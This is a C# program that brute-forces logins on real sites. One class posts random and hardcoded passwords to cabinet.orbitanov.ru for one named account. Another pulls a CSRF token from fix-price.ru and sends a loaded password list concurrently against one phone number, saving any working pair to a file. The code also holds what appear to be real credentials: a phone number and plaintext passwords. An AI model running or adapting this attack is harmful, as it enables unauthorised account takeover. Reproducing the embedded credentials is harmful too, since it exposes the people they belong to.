using AngleSharp;
using AngleSharp.Dom;
using AngleSharp.Html.Dom;
using AngleSharp.Html.Parser;
using AngleSharp.Io;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;


namespace InstagramSaver
{

    class OrbitaBruteForce
    {
        public OrbitaBruteForce()
        {

        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public async Task Brute()
        {
            List<Task> tasks = new List<Task>();
            List<string> passwords = new List<string>();
            for (int i = 0; i < 10; i++)
            {
                passwords.Add(RandomString(6));
            }
            passwords.Add("e6tCDz");
            //foreach (var password in passwords)
            //{
            //    tasks.Add(Connect("npi4351", password));
            //}
            //Task.WaitAll(tasks.ToArray());
            foreach (var password in passwords)
            {
                await Connect("npi4351", password);
            }
        }

        private async Task Connect(string login, string password)
        {
            var config = Configuration.Default.WithDefaultCookies().WithDefaultLoader();
            var context = BrowsingContext.New(config);
            var dictonary = new Dictionary<string, string>();
            dictonary.Add(@"LoginForm[login]", login);
            dictonary.Add(@"LoginForm[password]", password);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://cabinet.orbitanov.ru/site/login"),
                dictonary);
            var request = await context.OpenAsync(documentRequest);
            Console.WriteLine(request.Title);
        }

    }

    class FixPriceBF
    {
        private List<string> passwords;
        public int Founded = 0;
        private void loadPasswords(string path)
        {
            Passwords = new List<string>();
            StreamReader sr = new StreamReader(path);
            string line;
            while (!sr.EndOfStream)
            {
                line = sr.ReadLine();
                Passwords.Add(line);
            }
            sr.Close();
            Console.WriteLine($"Загружено {Passwords.Count} паролей");
        }

        IBrowsingContext context1;
        readonly Dictionary<string, string> dictonary1 = new Dictionary<string, string>();

        public List<string> Passwords { get => passwords; private set => passwords = value; }

        public FixPriceBF(string passwordDataPath)
        {
            loadPasswords(passwordDataPath);

            var config = Configuration.Default
.WithDefaultCookies()
.WithDefaultLoader();
            context1 = BrowsingContext.New(config);

            var document = context1.OpenAsync("https://fix-price.ru/personal/").Result;
            var sessionCsrf = document.QuerySelector("input[name=CSRF]").GetAttribute("value");
            dictonary1.Add(@"AUTH_FORM", "Y");
            dictonary1.Add(@"TYPE", "AUTH");
            dictonary1.Add(@"CSRF", sessionCsrf);
            dictonary1.Add(@"backurl", @"/personal/");
            dictonary1.Add(@"auth_method", "phone");


            //List<Task<IDocument>> documents = new List<Task<IDocument>>();
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)2"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)2"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
            //Task.WaitAll(documents.ToArray());

        }

       

        public async Task Brute()
        {
            List<Task<IDocument>> documents = new List<Task<IDocument>>();
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)2"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)2"));
            //documents.Add(Connect("+7 (999) 539-67-65", "1488Bambuk)"));
            //Task.WaitAll(documents.ToArray());
            foreach (var password in Passwords)
            {
                documents.Add(ConnectPlus("+7 (999) 539-67-65", password));
            }
            Task.WaitAll(documents.ToArray());
        }
        public async Task<IDocument> Connect(string login = "+7 (999) 539-67-65", string password = "1488Bambuk)")
        {
            var config = Configuration.Default
.WithDefaultCookies()
.WithDefaultLoader();
            var context = BrowsingContext.New(config);
            Console.WriteLine($"{login} {password}");
            var document = await context.OpenAsync("https://fix-price.ru/personal/");
            var sessionCsrf = document.QuerySelector("input[name=CSRF]").GetAttribute("value");
            var dictonary = new Dictionary<string, string>();
            dictonary.Add(@"AUTH_FORM", "Y");
            dictonary.Add(@"TYPE", "AUTH");
            dictonary.Add(@"CSRF", sessionCsrf);
            dictonary.Add(@"backurl", @"/personal/");
            dictonary.Add(@"auth_method", "phone");
            dictonary.Add(@"login", login);
            dictonary.Add(@"password", password);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://fix-price.ru/ajax/auth_user.php"),
                dictonary);
            var result = await context.OpenAsync(documentRequest);
            if (unicodeEncode(result.Source.Text) == "{\"res\":1}")
            {
                Console.WriteLine($"Успешный вход {login} {password}");
                File.WriteAllText("result.txt", $"{login} {password}");
            }
            else
            {
                Console.WriteLine($"Неправильный пароль {login} {password}");
            }
            return result;
        }

        public async Task<IDocument> ConnectPlus(string login = "+7 (999) 539-67-65", string password = "1488Bambuk)")
        {
            var dictonary2 = dictonary1.ToDictionary(entry => entry.Key,
                                               entry => entry.Value);
            dictonary2.Add(@"login", login);
            dictonary2.Add(@"password", password);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://fix-price.ru/ajax/auth_user.php"),
                dictonary2);

            var result = await context1.OpenAsync(documentRequest);
            if (unicodeEncode(result.Source.Text) == "{\"res\":1}")
            {
                Console.WriteLine($"Успешный вход {login} {password}");
                File.WriteAllText("result.txt", $"{login} {password}");
                Founded++;
            }
            else
            {
                Console.WriteLine($"Неправильный пароль {login} {password}");
            }
            return result;
        }

        private static string unicodeEncode(string text)
        {
            var rx = new Regex(@"\\u([0-9A-Z]{4})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
            return rx.Replace(text, p => new string((char)int.Parse(p.Groups[1].Value, NumberStyles.HexNumber), 1));
        }
    }

    
    class Program
    {
        static void Main(string[] args)
        {
            var fixprice = new FixPriceBF("test.txt");
            //fixprice.Connect("qwe", "qwe").Wait();
            Stopwatch watch = new Stopwatch();
            watch.Start();
            fixprice.Brute().Wait();
            watch.Stop();
            Console.WriteLine($"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}");
            Console.WriteLine($"Валидных: {fixprice.Founded}");
            Console.WriteLine($"Валидные в result.txt");

            File.AppendAllText("log.txt", $"Проверено {fixprice.Passwords.Count} паролей за {watch.Elapsed}\n");

            Console.ReadKey();
            
        }

        private static async Task Open()
        {
            var config = Configuration.Default
    .WithDefaultCookies()
    .WithDefaultLoader();
            var context = BrowsingContext.New(config);


            var dictonary = new Dictionary<string, string>();
            dictonary.Add(@"LoginForm[login]", "npi4351");
            dictonary.Add(@"LoginForm[password]", "e6tCDz");
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://cabinet.orbitanov.ru/site/login"),
                dictonary);
            var request = await context.OpenAsync(documentRequest);
            Console.WriteLine(request.Title);
            //File.WriteAllText("index.html", document.Source.Text);

        }
    }
}
